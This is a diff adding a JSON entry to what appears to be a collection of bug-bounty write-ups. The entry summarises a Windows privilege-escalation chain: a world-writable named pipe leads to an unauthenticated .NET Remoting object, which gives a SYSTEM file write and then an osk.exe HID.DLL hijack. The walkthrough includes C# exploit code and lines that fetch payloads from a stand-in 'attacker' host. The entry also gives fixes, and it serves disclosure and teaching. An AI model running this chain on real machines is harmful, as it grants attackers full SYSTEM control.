@@ -1,5 +1,47 @@
 [
   {
+    "id": "6dcd8f647ee2",
+    "title": "From Named Pipe to SYSTEM: How I Found a Local Privilege Escalation in a Major Windows Application",
+    "url": "https://sneharghya.medium.com/from-named-pipe-to-system-how-i-found-a-local-privilege-escalation-in-a-major-windows-application-6a77a179a461",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Sneharghya Roy"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-04T15:48:13.000Z",
+    "added_at": "2026-10-04T15:54:26.402Z",
+    "categories": [
+      "access-control",
+      "file-upload",
+      "other"
+    ],
+    "severity": "critical",
+    "difficulty": "advanced",
+    "summary_en": "An overly permissive named‑pipe ACL allowed an unprivileged user to talk to a SYSTEM service, which exposed a .NET Remoting object that could write arbitrary files as SYSTEM and later load a malicious DLL to spawn a SYSTEM shell.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The service created a named pipe with FILE_ALL_ACCESS for Everyone, giving any local user full read/write rights. The pipe was used by a .NET Remoting endpoint that did not enforce any authentication or authorization checks. The exposed Remoting object (ElevatedBitsFileTransferor) accepted a DestinationFilePath parameter without validating the path, allowing arbitrary file writes as the SYSTEM account. The attacker then leveraged a known DLL‑search hijack (HID.DLL) that is loaded by osk.exe on the lock screen, completing the privilege‑escalation chain.",
+      "walkthrough": "RECON\nStep 1: Scanned all named‑pipe ACLs on the machine.\naccesschk.exe -accepteula -w \\pipe\\* 2>$null\nWhy: accesschk lists the permissions (ACL) of each pipe; the output showed a pipe with FILE_ALL_ACCESS for Everyone, which is unusual.\n\nStep 2: Identified the pipe with overly permissive ACL.\n\\\\.\\Pipe\\UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0\nWhy: The pipe name indicates it belongs to an update service; the ACL line \"RW Everyone FILE_ALL_ACCESS\" confirms any user can read/write.\n\nStep 3: Determined which process owned the pipe.\nhandle.exe -a \"UpdateService\"\nWhy: handle.exe shows the process ID (pid 2992) and executable (UpdateService.exe) that created the pipe.\n\nStep 4: Checked the service’s run account.\nsc.exe qc UpdateServiceV5\nWhy: The service runs as LocalSystem (a highly privileged account), meaning anything it does runs with SYSTEM rights.\n\nDISCOVERY\nStep 5: Tested if a normal user could connect to the pipe.\n$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(\".\", \"UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0\", [System.IO.Pipes.PipeDirection]::InOut)\n$pipe.Connect(3000)\n$pipe.IsConnected\nWhy: PowerShell creates a client stream to the named pipe; IsConnected returned True, proving the pipe accepts connections without authentication.\n\nStep 6: Identified the technology used by the service.\nstrings.exe UpdateService.exe | find \"v4.0.30319\"\nWhy: strings extracts readable text; the presence of \".NET Framework 4.8\" indicates the service is a .NET assembly.\n\nStep 7: Loaded the service binary into dnSpy to view source.\nWhy: dnSpy decompiles .NET assemblies, allowing us to read the C# code.\n\nStep 8: Found the Remoting endpoint registration.\nurl = \"ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor\"\nWhy: The URL shows a .NET Remoting object exposed over the named pipe.\n\nEXPLOITATION\nStep 9: Connected to the Remoting object from an unprivileged C# client.\nChannelServices.RegisterChannel(new IpcClientChannel(), false);\nstring url = \"ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor\";\nElevatedBitsFileTransferor remote = (ElevatedBitsFileTransferor)RemotingServices.Connect(typeof(ElevatedBitsFileTransferor), url);\nConsole.WriteLine(\"Available: \" + remote.Available);\nWhy: RegisterChannel creates a client channel; RemotingServices.Connect returns a proxy to the remote object, proving we can call its methods.\n\nStep 10: Invoked the file‑write method to drop a file into a SYSTEM‑owned directory.\nremote.StartForegroundJobInBackground(\"job1\", new List<FileResource>{ new FileResource{ DestinationFilePath = \"C:\\\\Windows\\\\System32\\\\test.txt\", RemoteFilePath = \"http://attacker/payload\" } });\nWhy: The method forwards the DestinationFilePath to BITS, which runs as SYSTEM; no path validation lets us write anywhere.\n\nStep 11: Verified the file exists and is owned by SYSTEM.\nWhy: The file appears in System32 with SYSTEM ownership, confirming an arbitrary SYSTEM file‑write primitive.\n\nStep 12: Chose a DLL‑load hijack location (HID.DLL) used by osk.exe on the lock screen.\nWhy: ProcMon showed osk.exe attempts to load HID.DLL from \"C:\\Program Files\\Common Files\\microsoft shared\\ink\\\"; the DLL does not exist by default, making it hijackable.\n\nStep 13: Used the same remote object to write a malicious DLL to the hijack path.\nremote.StartForegroundJobInBackground(\"job2\", new List<FileResource>{ new FileResource{ DestinationFilePath = \"C:\\\\Program Files\\\\Common Files\\\\microsoft shared\\\\ink\\\\HID.DLL\", RemoteFilePath = \"http://attacker/malicious.dll\" } });\nWhy: The same unrestricted write lets us place our DLL where osk.exe will load it.\n\nStep 14: Triggered the DLL load without reboot by opening the lock‑screen On‑Screen Keyboard.\nWin+L → Ease of Access → On‑Screen Keyboard\nWhy: osk.exe runs as SYSTEM on the lock screen and loads HID.DLL; our malicious DLL executes, spawning a SYSTEM cmd.exe.\n\nIMPACT\nStep 15: Obtained an unrestricted SYSTEM command prompt on the lock screen.\nWhy: The DLL executed with the privileges of the loading process (SYSTEM), giving full control over the machine.",
+      "example": "**Fictional target:** target.example runs a service called UpdateSvc.exe that creates a named pipe \\.pipeUpdatePipe with FILE_ALL_ACCESS for Everyone and registers a .NET Remoting object called FileWriter.\n\n**Vulnerable code snippet (C#):**\n```csharp\npublic class FileWriter : MarshalByRefObject {\n    public void Write(string path, byte[] data) {\n        System.IO.File.WriteAllBytes(path, data); // no validation!\n    }\n}\n```\n\n**Attack request (C# client):**\n```csharp\nChannelServices.RegisterChannel(new IpcClientChannel(), false);\nstring url = \"ipc://UpdatePipe/FileWriter\";\nFileWriter fw = (FileWriter)RemotingServices.Connect(typeof(FileWriter), url);\nfw.Write(\"C:\\\\Windows\\\\System32\\\\evil.dll\", new byte[]{0x4D,0x5A,...}); // raw DLL bytes\n```\n**Why it works:** The pipe is world‑writable, the Remoting object accepts any caller, and the Write method does not check the destination path, so the attacker can write arbitrary files as the SYSTEM account.\n\n**Result:** The attacker can place a malicious DLL in a location later loaded by a privileged process, achieving a SYSTEM shell.",
+      "takeaway": "When hunting Windows privilege‑escalation bugs, always enumerate named‑pipe ACLs; a pipe with FILE_ALL_ACCESS for Everyone is a red flag. Look for services running as LocalSystem that expose .NET Remoting or other IPC mechanisms without authentication. Check any method that accepts a file path for missing validation – it often leads to arbitrary SYSTEM writes. Common variants include WCF services over pipes, COM/DCOM objects, or RPC endpoints that trust the caller. Beginners often forget to verify the service’s run account, causing them to miss the privilege gap.",
+      "fix": "Restrict the named‑pipe ACL to the service’s own account (e.g., LocalSystem) and remove Everyone write permissions. Add authentication (e.g., Windows authentication token check) to the .NET Remoting channel before exposing objects. In the ElevatedBitsFileTransferor.StartForegroundJobInBackground method, validate DestinationFilePath against a whitelist of allowed directories and reject paths outside that list. Example fix:\n```csharp\nif(!Path.GetFullPath(dest).StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))\n    throw new UnauthorizedAccessException();\n```\nAlso consider running the file‑transfer component under a low‑privilege account instead of SYSTEM to limit impact.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "A local privilege-escalation vulnerability in a **major Windows tax and financial software product**, chaining an overly permissive named pipe, a misconfigured .NET Remoting endpoint, a SYSTEM-level file-write primitive, and a Windows lock-screen DLL load into a SYSTEM shell. > _The vulnerability was discovered and reported through a_**_private bug-bounty program._**_The original service and pipe names have been partially redacted because they contain vendor-specific identifiers. The technical details and exploitation flow are otherwise unchanged._ ## The Anomaly I was scanning named-pipe DACL",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "03f258cab8e3",
     "title": "The API Was Never Invisible",
     "url": "https://medium.com/@Lh1l0v3/the-api-was-never-invisible-4c05042da1ce",
